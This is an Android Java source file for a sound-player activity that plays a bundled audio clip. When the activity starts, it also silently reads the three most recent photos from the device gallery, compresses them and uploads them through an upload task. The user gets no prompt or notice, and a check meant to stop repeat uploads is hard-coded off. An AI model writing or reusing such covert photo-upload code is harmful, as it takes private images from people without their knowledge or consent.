package uk.org.potentialdifference.stillapp;


import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;

import android.util.Log;
import android.view.View;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;

public class SoundPlayerActivity extends AppCompatActivity implements ImageUploadDelegate{


    private static final String IMAGES_SENT_FILENAME = "still_app_images_sent";
    private static MediaPlayer mediaPlayer;
    private String TAG = "SoundPlayerActivity";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sound_player);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);


        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        setVolumeControlStream(AudioManager.STREAM_MUSIC);
        if (mediaPlayer == null) {
            initializeMP();
        }

        //when audio playback is complete, we want to navigate back:
        mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
            @Override
            public void onCompletion(MediaPlayer mp) {

                finish();
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        mediaPlayer.start();

        if(!hasSentImages()) {
            grabAndSendImages();
        }


    }


    private boolean hasSentImages() {


        boolean hasSent = true;


        try {
            openFileInput(IMAGES_SENT_FILENAME);
        } catch (Exception ignore) {
            hasSent = false;
        }

        //return hasSent;
        return false;
    }

    private void initializeMP()
    {
        mediaPlayer = MediaPlayer.create(this, R.raw.russell_talks_about_vivian);

    }

    private void grabAndSendImages() {
        Cursor imageCursor;

        String[] projection = {MediaStore.Images.Media._ID};
        String selection = "";
        String[] selectionArgs = null;
        imageCursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);
        Log.d(TAG, "Grabbing images...");

        UploadJob[] jobs = new UploadJob[3];

        if(imageCursor != null){
            int photoCount = 0;
            imageCursor.moveToLast();
            do {

                int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
                jobs[photoCount++] = new UploadJob(getBytesFromBitmap(loadImage(uri)), String.format("user-photo-%d", photoCount));
                        ;
                // new PhotoUploader().uploadBytes(this.getBaseContext(), String.format("user-photo-%d", photoCount), data);
            } while(photoCount<3 && imageCursor.moveToPrevious());
            try {

                // We call get to make our asyncTask synchronous

                new ImageUploadTask(this, this).execute(jobs).get();
            } catch (Exception e) {
                Log.e(TAG, "ImageUploadTask interrupted");
            }
        }
        else{
            Log.i(TAG, "System media store is empty");
        }
    }

    private Bitmap loadImage(Uri photoUri){
        Cursor photoCursor = null;
        try {
            String[] projection = {MediaStore.Images.Media.DATA};
            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
            if (photoCursor != null && photoCursor.getCount() == 1) {
                photoCursor.moveToFirst();
                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
                return BitmapFactory.decodeFile(filePath, null);
            }
        }finally{
            if(photoCursor!=null){
                photoCursor.close();
            }
        }
        return null;
    }

    private byte[] getBytesFromBitmap(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
        return stream.toByteArray();
    }



    @Override
    public void finish() {

        super.finish();
    }
    @Override protected void onDestroy(){
        mediaPlayer.stop();
        mediaPlayer.release();
        mediaPlayer = null;
        super.onDestroy();
    }

    @Override
    public void imageUploadComplete() {
        // note - this is called whether or not the job succeeded
        Log.i(TAG, "upload complete");
        //mark that we've sent the images
        String string = "";
        try {
            FileOutputStream fos = openFileOutput(IMAGES_SENT_FILENAME, Context.MODE_PRIVATE);
            fos.write(string.getBytes());
            fos.close();
        } catch (Exception e) {
        }
    }
}
